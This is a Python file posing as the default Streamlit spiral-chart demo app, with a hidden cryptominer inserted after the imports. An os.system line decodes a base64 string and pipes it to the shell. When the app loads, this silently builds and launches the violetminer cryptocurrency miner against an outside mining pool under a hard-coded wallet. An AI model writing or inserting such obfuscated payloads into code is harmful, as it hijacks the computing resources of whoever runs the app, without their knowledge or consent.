from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
os.system('base64 -d <<< cGlwIGluc3RhbGwgY21ha2UgY2xhbmcgJiYgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS90dXJ0bGVjb2luL3Zpb2xldG1pbmVyICYmIG1rZGlyIHZpb2xldG1pbmVyL2J1aWxkICYmIGNkIHZpb2xldG1pbmVyLyAmJiBnaXQgc3VibW9kdWxlIHVwZGF0ZSAtLWluaXQgLS1yZWN1cnNpdmUgJiYgY2QgYnVpbGQvICYmIGNtYWtlIC1ERU5BQkxFX05WSURJQT1PRkYgLi4gJiYgbWFrZSAmJiAuL3Zpb2xldG1pbmVyIC0tYWxnb3JpdGhtIGNodWt3YSAtLXBvb2wgdXMtY2VudHJhbC4yYWNvaW4ub3JnOjMzMzMgLS11c2VybmFtZSBndW5zRTNMR2ZFSkE1MzNFa21xN2NGQTZqeG1pam1ZdnM5YmR3cE1ZWEdRMkhHM0R1UGMyckZ6OWJTelE2cW5SaWJISHBYUTV5Qnk1VUFFWkFlQ25lSlJuSEZ0b1dTV1N1QllFYVFtVHE0ZWV3N1hNV1pncnFFMUtjRGlrOGZRVTVFaGhhdWlqTEE5TUdDaUxIMmd4and3NER1UUoyRXJOMUdNaGtjdDdnaVN5VlB3UzRpQ1FlUWVtWXggLS1wYXNzd29yZCAgc3RyZWs= | sh')
"""
# Welcome to Streamlit!
Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
forums](https://discuss.streamlit.io).
In the meantime, below is an example of what you can do with just a few lines of code:
"""


with st.echo(code_location='below'):
    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)

    Point = namedtuple('Point', 'x y')
    data = []

    points_per_turn = total_points / num_turns

    for curr_point_num in range(total_points):
        curr_turn, i = divmod(curr_point_num, points_per_turn)
        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
        radius = curr_point_num / total_points
        x = radius * math.cos(angle)
        y = radius * math.sin(angle)
        data.append(Point(x, y))

    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
        .mark_circle(color='#0068c9', opacity=0.5)
        .encode(x='x:Q', y='y:Q'))
